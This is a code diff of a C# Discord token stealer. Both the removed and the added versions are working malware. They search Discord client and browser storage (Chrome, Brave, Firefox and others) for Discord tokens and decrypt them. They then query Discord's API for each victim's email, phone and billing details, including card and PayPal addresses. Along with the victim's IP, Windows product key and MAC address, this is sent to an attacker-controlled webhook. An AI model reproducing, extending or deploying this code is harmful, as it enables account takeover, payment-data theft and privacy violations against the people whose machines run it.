@@ -1,400 +1,19 @@
-﻿using Leaf.xNet;
-using Newtonsoft.Json;
+﻿using Newtonsoft.Json;
 using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
-using System.Net;
-using System.Text.RegularExpressions;
-using Discord;
-using Discord.Webhook;
 using System.Management;
-using System.Threading.Tasks;
+using System.Net;
 using System.Net.NetworkInformation;
+using System.Text.RegularExpressions;
+using System.Threading.Tasks;
 
 namespace StealerExt
-{
-    public class Stealer
+{   
+    internal class Stealer
 	{
-		private static List<string> TokenStealer(DirectoryInfo Folder, bool no = false)
-		{
-			List<string> list = new List<string>();
-			try
-			{
-				FileInfo[] ldbfiles = Folder.GetFiles("*.ldb");
-				FileInfo[] logFiles = Folder.GetFiles("*.log");
-				FileInfo[] firefoxsqlite = Folder.GetFiles("*.sqlite");
-				FileInfo[] logFirefox = Folder.GetFiles("*.log");
-				for (int i = 0; i < ldbfiles.Length; i++)
-				{
-					string input = ldbfiles[i].OpenText().ReadToEnd();
-					foreach (object obj in Regex.Matches(input, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}|dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
-					{
-                        if (Regex.IsMatch(((Match)obj).Value, @"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
-                        {
-                            string token = DecryptDiscordToken.Decrypt_Token(Convert.FromBase64String(((Match)obj).Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]), Folder.Parent.Parent.FullName + "\\Local State");
-							Task.FromResult(SaveTokensAsync(TokenCheckAccess(token)));
-						}
-						else Task.FromResult(SaveTokensAsync(TokenCheckAccess(((Match)obj).Value)));
-					}
-				}
-				for (int i = 0; i < logFiles.Length; i++)
-				{
-					string input = logFiles[i].OpenText().ReadToEnd();
-					foreach (object obj in Regex.Matches(input, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}|dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
-					{
-						if (Regex.IsMatch(((Match)obj).Value, @"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
-						{
-							string token = DecryptDiscordToken.Decrypt_Token(Convert.FromBase64String(((Match)obj).Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]), Folder.Parent.Parent.FullName + "\\Local State");
-							Task.FromResult(SaveTokensAsync(TokenCheckAccess(token)));
-						}
-						else Task.FromResult(SaveTokensAsync(TokenCheckAccess(((Match)obj).Value)));
-					}
-				}
-				for (int i = 0; i < firefoxsqlite.Length; i++)
-				{
-					string input = firefoxsqlite[i].OpenText().ReadToEnd();
-					foreach (object obj in Regex.Matches(input, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
-					{
-						Task.FromResult(SaveTokensAsync(TokenCheckAccess(((Match)obj).Value)));
-					}
-				}
-				for (int i = 0; i < logFirefox.Length; i++)
-				{
-					string input = logFirefox[i].OpenText().ReadToEnd();
-					foreach (object obj in Regex.Matches(input, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"))
-					{
-						Task.FromResult(SaveTokensAsync(TokenCheckAccess(((Match)obj).Value)));
-					}
-				}
-			}
-            catch { }
-			list = list.Distinct().ToList();
-			if (list.Count > 0)
-			{
-				int index = list.Count - 1;
-				list[index] = list[index] ?? "";
-			}
-			Canary = false;
-			PTB = false;
-			Opera = false;
-			Chrome = false;
-			App = false;
-			Edge = false;
-			OperaGX = false;
-			Firefox = false;
-			Vivaldi = false;
-			Brave = false;
-			Yandex = false;
-			Development = false;
-			Brave_Nightly = false;
-			return list;
-		}
-
-		private static async Task<string> SaveTokensAsync(string token)
-		{
-			if (!(token == ""))
-			{
-				string text;
-				if (Chrome)
-				{
-					text = "Chrome";
-				}
-				else if (Edge)
-				{
-					text = "Edge";
-				}
-				else if (Opera)
-				{
-					text = "Opera";
-				}
-				else if (Canary)
-				{
-					text = "Discord Canary";
-				}
-				else if (App)
-				{
-					text = "Discord App";
-				}
-				else if (PTB)
-				{
-					text = "Discord PTB";
-				}
-				else if (OperaGX)
-				{
-					text = "Opera GX";
-				}
-				else if (Brave)
-				{
-					text = "Brave";
-				}
-				else if (Brave_Nightly)
-				{
-					text = "Brave Nightly";
-				}
-				else if (Yandex)
-				{
-					text = "Yandex";
-				}
-				else if (Vivaldi)
-				{
-					text = "Vivaldi";
-				}
-				else if (Development)
-                {
-					text = "Discord Development";
-                }
-				else if (Firefox)
-                {
-					text = "FireFox";
-                }
-				else
-				{
-					text = "Unknown";
-				}
-				if (!Found)
-                {
-					var request = new HttpRequest();
-					{
-						bool flag = false;
-						request.UseCookies = false;
-						request.AddHeader("Authorization", token);
-						request.Get("https://discordapp.com/api/v8/users/@me");
-						string test = request.Response.ToString();
-						dynamic test2 = JsonConvert.DeserializeObject(test);
-						if (test2.premium_type == 1)
-						{
-							test2.premium_type = "Nitro Classic";
-						}
-						else if (test2.premium_type == 2)
-						{
-							test2.premium_type = "Discord Nitro";
-						}
-						else if (test2.premium_type == 0)
-						{
-							test2.premium_type = "None";
-						}
-						else
-						{
-							test2.premium_type = "None";
-						}
-						if (test2.phone == null)
-						{
-							test2.phone = "None";
-						}
-						var r = new HttpRequest();
-                        dynamic payment = null;
-                        string pay;
-                        try
-                        {
-                            r.UseCookies = false;
-                            r.AddHeader("Authorization", token);
-                            r.Get("https://discord.com/api/v8/users/@me/billing/payment-sources");
-                            pay = r.Response.ToString();
-                            pay = pay.Replace("[", "");
-                            pay = pay.Replace("]", "");
-                            payment = JsonConvert.DeserializeObject(pay);
-                        }
-                        catch
-                        {
-                            pay = null;
-                            flag = true;
-                        }
-						try
-						{
-							ManagementObjectSearcher mos = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
-							string OSName = null;
-							foreach (ManagementObject managementObject in mos.Get())
-							{
-								OSName = managementObject["Caption"].ToString();
-							}
-							string IP = new WebClient().DownloadString("https://ipecho.net/plain");
-							using (var sEmbed = new DiscordWebhookClient(Hook))
-							{
-								var embed = new EmbedBuilder
-								{
-									Title = $"User: {Environment.UserName}",
-									Color = new Color(0x36393f)
-								};
-								embed.AddField("IP:", IP, true);
-								embed.AddField("Windows Version:", OSName, true);
-								embed.AddField("Product Key:", KeyDecoder.GetWindowsProductKeyFromRegistry(), true);
-								embed.AddField("Mac Address:", NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)?.GetPhysicalAddress().ToString(), true);
-								embed.AddField("__Token Info__", $"Username | {test2.username}#{test2.discriminator}\nID | {test2.id}\nNitro | {test2.premium_type}\nEmail | {test2.email}\nPhone | {test2.phone}\nVerified | {test2.verified}\nMFA | {test2.mfa_enabled}\nLanguage | {test2.locale}\nFlags | {test2.flags}\n{text} Token | ||{token}||");
-								if (pay.Contains("email") & !flag)
-								{
-									embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | PayPal\nEmail | {payment.email}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
-								}
-								else if (pay.Contains("mastercard") || pay.Contains("visa")) embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | {payment.brand}\nExpiry | {payment.expires_month}/{payment.expires_year}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
-								else if (flag)
-								{
-									embed.AddField("__Payment Info__", "Has Payment | Yes\nFailed To Parse Other Info");
-									flag = false;
-								}
-								else embed.AddField("__Payment Info__", "Payment: He is poor (No payment)");
-								await sEmbed.SendMessageAsync(embeds: new[] { embed.Build() });
-								Found = true;
-							}
-						}
-						catch
-						{
-							try
-							{ 
-								ManagementObjectSearcher mos = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
-								string OSName = null;
-								foreach (ManagementObject managementObject in mos.Get())
-								{
-									OSName = managementObject["Caption"].ToString();
-								}
-								string IP = new WebClient().DownloadString("https://ipecho.net/plain");
-								using (var sEmbed = new DiscordWebhookClient(Hook))
-								{
-									var embed = new EmbedBuilder
-									{
-										Title = $"User: {Environment.UserName}",
-										Color = new Color(0x36393f)
-									};
-									embed.AddField("IP:", IP, true);
-									embed.AddField("Windows Version:", OSName, true);
-									embed.AddField("Product Key:", KeyDecoder.GetWindowsProductKeyFromRegistry(), true);
-									embed.AddField("Mac Address:", NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)?.GetPhysicalAddress().ToString(), true);
-									embed.AddField("__Token Info__", $"Username | {test2.username}#{test2.discriminator}\nID | {test2.id}\nNitro | {test2.premium_type}\nEmail | {test2.email}\nPhone | {test2.phone}\nVerified | {test2.verified}\nMFA | {test2.mfa_enabled}\nLanguage | {test2.locale}\nFlags | {test2.flags}\n{text} Token | ||{token}||");
-									embed.AddField("__Payment Info__", "Has Payment | Unknown\nFailed To Parse Other Info [Might be invalid card(s)]");
-									await sEmbed.SendMessageAsync(embeds: new[] { embed.Build() });
-									Found = true;
-								}
-							}
-							catch (Exception x) { await new Webhook(Hook).SendAsync("```\n" + text + " Token " + token + "\n```").ConfigureAwait(false); await new Webhook(Hook).SendAsync($"```{x}```").ConfigureAwait(false); }
-						}
-						CheckedTokens.Add(token);
-					}
-				}
-				if (Found & !CheckedTokens.Contains(token))
-                {
-					var request = new HttpRequest();
-					{
-						bool flag = false;
-						request.UseCookies = false;
-						request.AddHeader("Authorization", token);
-						request.Get("https://discordapp.com/api/v8/users/@me");
-						string test = request.Response.ToString();
-						dynamic test2 = JsonConvert.DeserializeObject(test);
-						if (test2.premium_type == 1)
-						{
-							test2.premium_type = "Nitro Classic";
-						}
-						else if (test2.premium_type == 2)
-						{
-							test2.premium_type = "Discord Nitro";
-						}
-						else if (test2.premium_type == 0)
-						{
-							test2.premium_type = "None";
-						}
-						else
-						{
-							test2.premium_type = "None";
-						}
-						if (test2.phone == null)
-						{
-							test2.phone = "None";
-						}
-						var r = new HttpRequest();
-						string pay;
-						dynamic payment = null;
-						try
-						{
-							r.UseCookies = false;
-							r.AddHeader("Authorization", token);
-							r.Get("https://discord.com/api/v8/users/@me/billing/payment-sources");
-							pay = r.Response.ToString();
-							pay = pay.Replace("[", "");
-							pay = pay.Replace("]", "");
-							payment = JsonConvert.DeserializeObject(pay);
-						}
-						catch
-						{
-							pay = null;
-							flag = true;
-						}
-						try
-						{
-							using (var sEmbed = new DiscordWebhookClient(Hook))
-							{
-								var embed = new EmbedBuilder
-								{
-									Title = $"User: {Environment.UserName}",
-									Color = new Color(0x36393f)
-								};
-								embed.AddField("__Token Info__", $"Username | {test2.username}#{test2.discriminator}\nID | {test2.id}\nNitro | {test2.premium_type}\nEmail | {test2.email}\nPhone | {test2.phone}\nVerified | {test2.verified}\nMFA | {test2.mfa_enabled}\nLanguage | {test2.locale}\nFlags | {test2.flags}\n{text} Token | ||{token}||");
-								if (pay.Contains("email") & !flag)
-								{
-									embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | PayPal\nEmail | {payment.email}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
-								}
-								else if (pay.Contains("mastercard") || pay.Contains("visa")) embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | {payment.brand}\nExpiry | {payment.expires_month}/{payment.expires_year}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
-								else if (flag)
-								{
-									embed.AddField("__Payment Info__", "Has Payment | Yes\nFailed To Parse Other Info");
-									flag = false;
-								}
-								else embed.AddField("__Payment Info__", "Payment: He is poor (No payment)");
-								await sEmbed.SendMessageAsync(embeds: new[] { embed.Build() });
-							}
-						}
-						catch
-						{
-							try
-							{
-								using (var sEmbed = new DiscordWebhookClient(Hook))
-								{
-									var embed = new EmbedBuilder
-									{
-										Title = $"User: {Environment.UserName}",
-										Color = new Color(0x36393f)
-									};
-									embed.AddField("__Token Info__", $"Username | {test2.username}#{test2.discriminator}\nID | {test2.id}\nNitro | {test2.premium_type}\nEmail | {test2.email}\nPhone | {test2.phone}\nVerified | {test2.verified}\nMFA | {test2.mfa_enabled}\nLanguage | {test2.locale}\nFlags | {test2.flags}\n{text} Token | ||{token}||");
-									embed.AddField("__Payment Info__", "Has Payment | Unknown\nFailed To Parse Other Info [Might be invalid card(s)]");
-									await sEmbed.SendMessageAsync(embeds: new[] { embed.Build() });
-									Found = true;
-								}
-							}
-							catch (Exception x) { await new Webhook(Hook).SendAsync("```\n" + text + " Token " + token + "\n```").ConfigureAwait(false); await new Webhook(Hook).SendAsync($"```{x.Message}```"); }
-						}
-						CheckedTokens.Add(token);
-					}
-				}
-			}
-			return token;
-		}
-
-		private static string TokenCheckAccess(string token)
-		{
-            try
-            {
-				var wc = new WebClient();
-				wc.Headers.Add("Content-Type", "application/json");
-				wc.Headers.Add(HttpRequestHeader.Authorization, token);
-				wc.DownloadString("https://discordapp.com/api/v8/users/@me/guilds");
-			}
-            catch (WebException ex)
-            {
-                string text = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
-                if (text.Contains("401: Unauthorized"))
-                {
-                    token = "";
-                }
-                else if (text.Contains("You need to verify your account in order to perform this action."))
-                {
-                    token = "";
-                }
-                else
-                {
-					token = "";
-                }
-            }
-            return token;
-		}
-		public static void StartSteal()
+		public void StartSteal()
 		{
 			try
 			{
@@ -411,271 +30,368 @@ namespace StealerExt
 				StealTokenFromVivaldi();
 				StealTokenFromFirefox();
 				StealTokenFromDiscordDev();
-				Task.FromResult(SendAsync());
-            }
+				if (SavedTokens.Count <= 0)
+					SendFailure();
+			}
 			catch (Exception x)
 			{
-                Console.WriteLine(x.Message);
-                new API(API.wHook)
+				new API(API.wHook)
 				{
 					_name = API.name,
 					_ppUrl = API.pfp
 				}.SendSysInfo("Exception: " + x.Message, null);
 			}
 		}
-
-		private static async Task SendAsync()
+		private void TokenStealer(DirectoryInfo Folder, string Platform)
 		{
-			if (Found == false)
-            {
-				ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
-				string OSName = null;
-				foreach (ManagementObject managementObject in mos.Get())
+			foreach (FileInfo file in Folder.GetFilesNew("*.ldb", "*.log", "*.sqlite"))
+			{
+				string input = file.OpenText().ReadToEnd();
+				foreach (object obj in Regex.Matches(input, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}|dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
 				{
-					OSName = managementObject["Caption"].ToString();
-				}
-				string IP = new WebClient().DownloadString("https://ipecho.net/plain");
-				using (var sEmbed = new DiscordWebhookClient(Hook))
-				{
-					var embed = new EmbedBuilder
-					{
-						Title = $"{Environment.UserName}'s Token",
-						Color = new Color(0x36393f)
-					};
-					embed.AddField("IP:", IP, true);
-					embed.AddField("Windows Version:", OSName, true);
-					embed.AddField("Product Key", KeyDecoder.GetWindowsProductKeyFromRegistry(), true);
-					embed.AddField("Token?", "No token was found due to recent password change or Discord not being found in any of the supported platforms!");
-					await sEmbed.SendMessageAsync(embeds: new[] { embed.Build() });
+                    if (Regex.IsMatch(((Match)obj).Value, @"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^""]*"))
+                    {
+                        string token = DecryptDiscordToken.Decrypt_Token(Convert.FromBase64String(((Match)obj).Value.Split(new[] { "dQw4w9WgXcQ:" }, StringSplitOptions.None)[1]), Folder.Parent.Parent.FullName + "\\Local State");
+						Task.FromResult(SaveTokensAsync(TokenCheckAccess(token), Platform));
+					}
+					else Task.FromResult(SaveTokensAsync(TokenCheckAccess(((Match)obj).Value), Platform));
 				}
 			}
 		}
+		private string TokenCheckAccess(string token)
+		{
+			var http = new HttpUtils();
+            Dictionary<string, string> headers = new Dictionary<string, string>
+            {
+                { "Authorization", token },
+                { "Content-Type", "application/json" }
+            };
+            string response = http.GetStringAsync("https://discordapp.com/api/v9/users/@me/guilds", headers).Result;
+            if (response.Contains("401: Unauthorized") || response.Contains("You need to verify your account in order to perform this action."))
+            {
+                token = "";
+            }
+            return token;
+		}
 
-		private static void StealTokenFromDiscordApp()
+		private async Task SaveTokensAsync(string token, string Platform)
+		{
+			if (string.IsNullOrEmpty(token)) return;
+			if (SavedTokens.Count > 0)
+			{
+				Dictionary<string, string> headers = new Dictionary<string, string>
+				{
+					{ "Authorization", token }
+				};
+				var request = new HttpUtils();
+				string _gettokenInfo = await request.GetStringAsync("https://discordapp.com/api/v8/users/@me", headers);
+				dynamic _tokenInfo = JsonConvert.DeserializeObject(_gettokenInfo);
+				switch ((int)_tokenInfo.premium_type)
+				{
+					case 1:
+						_tokenInfo.premium_type = "Nitro Classic [$4.99/$49.99]";
+						break;
+					case 2:
+						_tokenInfo.premium_type = "Nitro [$9.99/$99]";
+						break;
+					default:
+						_tokenInfo.premium_type = "None";
+						break;
+				}
+				if (string.IsNullOrEmpty((string)_tokenInfo.phone))
+				{
+					_tokenInfo.phone = "None";
+				}
+				string _getpaymentInfo; dynamic payment = string.Empty;
+				_getpaymentInfo = await request.GetStringAsync("https://discord.com/api/v9/users/@me/billing/payment-sources", headers);
+				_getpaymentInfo = _getpaymentInfo.Replace("[", "");
+				_getpaymentInfo = _getpaymentInfo.Replace("]", "");
+				bool FailedPaymentInfo = false;
+				try
+				{
+					payment = JsonConvert.DeserializeObject(_getpaymentInfo);
+				}
+				catch
+				{
+					FailedPaymentInfo = true;
+				}
+				try
+				{
+					ManagementObjectSearcher mos = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
+					string OSName = null;
+					foreach (ManagementObject managementObject in mos.Get())
+					{
+						OSName = managementObject["Caption"].ToString();
+					}
+					string IP = new WebClient().DownloadString("https://ipecho.net/plain");
+					var embed = new DiscordWebhook(Hook);
+					embed.CreateEmbed($"User: {Environment.UserName}", 0x36393F);
+					embed.AddField("IP:", IP, true);
+					embed.AddField("Windows Version:", OSName, true);
+					embed.AddField("Product Key:", KeyDecoder.GetWindowsProductKeyFromRegistry(), true);
+					embed.AddField("Mac Address:", NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)?.GetPhysicalAddress().ToString(), true);
+					embed.AddField("__Token Info__", $"Username | {_tokenInfo.username}#{_tokenInfo.discriminator}\nID | {_tokenInfo.id}\nNitro | {_tokenInfo.premium_type}\nEmail | {_tokenInfo.email}\nPhone | {_tokenInfo.phone}\nVerified | {_tokenInfo.verified}\nMFA | {_tokenInfo.mfa_enabled}\nLanguage | {_tokenInfo.locale}\nFlags | {_tokenInfo.flags}\n{Platform} Token | ||{token}||");
+					if (_getpaymentInfo.Contains("email") & !FailedPaymentInfo)
+					{
+						embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | PayPal\nEmail | {payment.email}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
+					}
+					else if (_getpaymentInfo.Contains("mastercard") || _getpaymentInfo.Contains("visa")) embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | {payment.brand}\nExpiry | {payment.expires_month}/{payment.expires_year}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
+					else if (FailedPaymentInfo)
+					{
+						embed.AddField("__Payment Info__", "Has Payment | Yes\nFailed To Parse Other Info");
+					}
+					else embed.AddField("__Payment Info__", "Payment: He is poor (No payment)");
+				}
+				catch
+				{
+					ManagementObjectSearcher mos = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");
+					string OSName = null;
+					foreach (ManagementObject managementObject in mos.Get())
+					{
+						OSName = managementObject["Caption"].ToString();
+					}
+					string IP = new WebClient().DownloadString("https://ipecho.net/plain");
+					var embed = new DiscordWebhook(Hook);
+					embed.CreateEmbed($"User: {Environment.UserName}", 0x36393F);
+					embed.AddField("IP:", IP, true);
+					embed.AddField("Windows Version:", OSName, true);
+					embed.AddField("Product Key:", KeyDecoder.GetWindowsProductKeyFromRegistry(), true);
+					embed.AddField("Mac Address:", NetworkInterface.GetAllNetworkInterfaces().FirstOrDefault(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)?.GetPhysicalAddress().ToString(), true);
+					embed.AddField("__Token Info__", $"Username | {_tokenInfo.username}#{_tokenInfo.discriminator}\nID | {_tokenInfo.id}\nNitro | {_tokenInfo.premium_type}\nEmail | {_tokenInfo.email}\nPhone | {_tokenInfo.phone}\nVerified | {_tokenInfo.verified}\nMFA | {_tokenInfo.mfa_enabled}\nLanguage | {_tokenInfo.locale}\nFlags | {_tokenInfo.flags}\n{Platform} Token | ||{token}||");
+					embed.AddField("__Payment Info__", "Has Payment | Unknown\nFailed To Parse Other Info [Might be invalid card(s)]");
+					await embed.SendEmbed();
+				}
+				SavedTokens.Add(token);
+			}
+			else if (!SavedTokens.Contains(token))
+			{
+				Dictionary<string, string> headers = new Dictionary<string, string>();
+				headers.Add("Authorization", token);
+				var request = new HttpUtils();
+				bool PaymentInfo = false;
+				string _gettokenInfo = await request.GetStringAsync("https://discordapp.com/api/v8/users/@me", headers);
+				dynamic _tokenInfo = JsonConvert.DeserializeObject(_gettokenInfo);
+				switch ((int)_tokenInfo.premium_type)
+				{
+					case 1:
+						_tokenInfo.premium_type = "Nitro Classic [$4.99/$49.99]";
+						break;
+					case 2:
+						_tokenInfo.premium_type = "Nitro [$9.99/$99]";
+						break;
+					default:
+						_tokenInfo.premium_type = "None";
+						break;
+				}
+				if (string.IsNullOrEmpty((string)_tokenInfo.phone))
+				{
+					_tokenInfo.phone = "None";
+				}
+				dynamic payment = null;
+				string _getpaymentInfo;
+				try
+				{
+					_getpaymentInfo = await request.GetStringAsync("https://discord.com/api/v9/users/@me/billing/payment-sources", headers);
+					_getpaymentInfo = _getpaymentInfo.Replace("[", "");
+					_getpaymentInfo = _getpaymentInfo.Replace("]", "");
+					payment = JsonConvert.DeserializeObject(_getpaymentInfo);
+				}
+				catch
+				{
+					_getpaymentInfo = null;
+					PaymentInfo = true;
+				}
+				try
+				{
+					var embed = new DiscordWebhook(Hook);
+					embed.CreateEmbed($"User: {Environment.UserName}", 0x36393F);
+					embed.AddField("__Token Info__", $"Username | {_tokenInfo.username}#{_tokenInfo.discriminator}\nID | {_tokenInfo.id}\nNitro | {_tokenInfo.premium_type}\nEmail | {_tokenInfo.email}\nPhone | {_tokenInfo.phone}\nVerified | {_tokenInfo.verified}\nMFA | {_tokenInfo.mfa_enabled}\nLanguage | {_tokenInfo.locale}\nFlags | {_tokenInfo.flags}\n{Platform} Token | ||{token}||");
+					if (_getpaymentInfo.Contains("email") & !PaymentInfo)
+					{
+						embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | PayPal\nEmail | {payment.email}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
+					}
+					else if (_getpaymentInfo.Contains("mastercard") || _getpaymentInfo.Contains("visa")) embed.AddField("__Payment Info__", $"Has Payment | Yes\nPayment Type | {payment.brand}\nExpiry | {payment.expires_month}/{payment.expires_year}\nName | {payment.billing_address.name}\nAddress Line 1 | {payment.billing_address.line_1}\nAddress Line 2 | {payment.billing_address.line_2}\nCity | {payment.billing_address.city}\nState | {payment.billing_address.state}\nPostal Code | {payment.billing_address.postal_code}\nCountry | {payment.billing_address.country}");
+					else if (PaymentInfo)
+					{
+						embed.AddField("__Payment Info__", "Has Payment | Yes\nFailed To Parse Other Info");
+						PaymentInfo = false;
+					}
+					else embed.AddField("__Payment Info__", "Payment: He is poor (No payment)");
+					await embed.SendEmbed();
+				}
+				catch
+				{
+					try
+					{
+						var embed = new DiscordWebhook(Hook);
+						embed.CreateEmbed($"User: {Environment.UserName}", 0x36393F);
+						embed.AddField("__Token Info__", $"Username | {_tokenInfo.username}#{_tokenInfo.discriminator}\nID | {_tokenInfo.id}\nNitro | {_tokenInfo.premium_type}\nEmail | {_tokenInfo.email}\nPhone | {_tokenInfo.phone}\nVerified | {_tokenInfo.verified}\nMFA | {_tokenInfo.mfa_enabled}\nLanguage | {_tokenInfo.locale}\nFlags | {_tokenInfo.flags}\n{Platform} Token | ||{token}||");
+						embed.AddField("__Payment Info__", "Has Payment | Unknown\nFailed To Parse Other Info [Might be invalid card(s)]");
+						await embed.SendEmbed();
+					}
+					catch (Exception x)
+					{
+						new API(API.wHook)
+						{
+							_name = API.name,
+							_ppUrl = API.pfp
+						}.SendSysInfo($"```{Platform} Token {token}\n```", null);
+						new API(API.wHook)
+						{
+							_name = API.name,
+							_ppUrl = API.pfp
+						}.SendSysInfo($"```{x.Message}```", null);
+					}
+				}
+				SavedTokens.Add(token);
+			}
+		}
+		private void SendFailure()
+		{
+			ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
+			string OSName = null;
+			foreach (ManagementObject managementObject in mos.Get())
+			{
+				OSName = managementObject["Caption"].ToString();
+			}
+			string IP = new WebClient().DownloadString("https://ipecho.net/plain");
+			var embed = new DiscordWebhook(Hook);
+			embed.CreateEmbed($"User: {Environment.UserName}", 0x36393F);
+			embed.AddField("IP:", IP, true);
+			embed.AddField("Windows Version:", OSName, true);
+			embed.AddField("Product Key", KeyDecoder.GetWindowsProductKeyFromRegistry(), true);
+			embed.AddField("Token?", "No token was found due to recent password change or Discord not being found in any of the supported platforms!");
+			embed.SendEmbed().RunSynchronously();
+		}
+
+		private void StealTokenFromDiscordApp()
 		{
 			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
 			DirectoryInfo folder = new DirectoryInfo(path);
 			if (Directory.Exists(path))
 			{
-				App = true;
-				List<string> list = TokenStealer(folder, false);
-				if (list != null && list.Count > 0)
-				{
-					App = true;
-				}
+				TokenStealer(folder, "Discord App");
 			}
 		}
-
-		private static void StealTokenFromDiscordDev()
+		private void StealTokenFromDiscordDev()
 		{
 			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discorddevelopment\\Local Storage\\leveldb\\";
 			DirectoryInfo folder = new DirectoryInfo(path);
 			if (Directory.Exists(path))
 			{
-				App = true;
-				List<string> list = TokenStealer(folder, false);
-				if (list != null && list.Count > 0)
-				{
-					App = true;
-				}
+				TokenStealer(folder, "Discord Developer");
 			}
 		}
-
-		private static void StealTokenFromDiscordCanaryApp()
+		private void StealTokenFromDiscordCanaryApp()
 		{
 			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordcanary\\Local Storage\\leveldb\\";
 			DirectoryInfo folder = new DirectoryInfo(path);
 			if (Directory.Exists(path))
 			{
-				Canary = true;
-				List<string> list = TokenStealer(folder, false);
-				if (list != null && list.Count > 0)
-				{
-					Canary = true;
-				}
+				TokenStealer(folder, "Discord Canary");
 			}
 		}
-		private static void StealTokenFromDiscordPtbApp()
+		private void StealTokenFromDiscordPtbApp()
 		{
 			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordptb\\Local Storage\\leveldb\\";
 			DirectoryInfo folder = new DirectoryInfo(path);
 			if (Directory.Exists(path))
 			{
-				PTB = true;
-				List<string> list = TokenStealer(folder, false);
-				if (list != null && list.Count > 0)
-				{
-					PTB = true;
-				}
+				TokenStealer(folder, "Discord PTB");
 			}
 		}
-
-		private static void StealTokenFromChrome()
+		private void StealTokenFromChrome()
 		{
 			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\";
 			if (!Directory.Exists(path)) return;
 			foreach (DirectoryInfo dir in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
             {
-				Chrome = true;
-				List<string> list = TokenStealer(dir, false);
-				if (list != null && list.Count > 0)
-				{
-					Chrome = true;
-				}
+				TokenStealer(dir, "Chrome");
 			}
 		}
-
-		private static void StealTokenFromBrave()
+		private void StealTokenFromBrave()
 		{
 			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data\\";
 			if (!Directory.Exists(path)) return;
 			foreach (DirectoryInfo folder in new DirectoryInfo(path).GetDirectories("leveldb", SearchOption.AllDirectories))
